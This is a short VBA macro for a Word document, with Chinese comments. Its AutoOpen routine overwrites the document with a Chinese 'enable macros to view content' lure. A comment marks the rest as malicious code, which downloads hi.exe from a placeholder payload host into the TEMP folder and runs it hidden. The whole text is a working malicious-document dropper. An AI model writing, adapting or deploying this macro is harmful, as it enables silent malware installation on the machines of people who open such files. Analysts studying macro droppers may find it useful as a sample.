Sub AutoOpen()
    ' 替换页面内容
    Dim doc As Document
    Set doc = ThisDocument
    doc.Content.Text = "文档内容已更新，请启用宏以查看完整内容。"

    ' 执行恶意代码
    Dim objXML As Object
    Dim objFile As Object
    Dim strURL As String
    Dim strPath As String

    strURL = "http://IP地址/payload/hi.exe"
    strPath = Environ("TEMP") & "\hi.exe"

    Set objXML = CreateObject("MSXML2.XMLHTTP")
    objXML.Open "GET", strURL, False
    objXML.Send

    If objXML.Status = 200 Then
        Set objFile = CreateObject("ADODB.Stream")
        objFile.Open
        objFile.Type = 1
        objFile.Write objXML.responseBody
        objFile.Position = 0
        objFile.SaveToFile strPath, 2
        objFile.Close
        Shell strPath, vbHide
    End If
End Sub
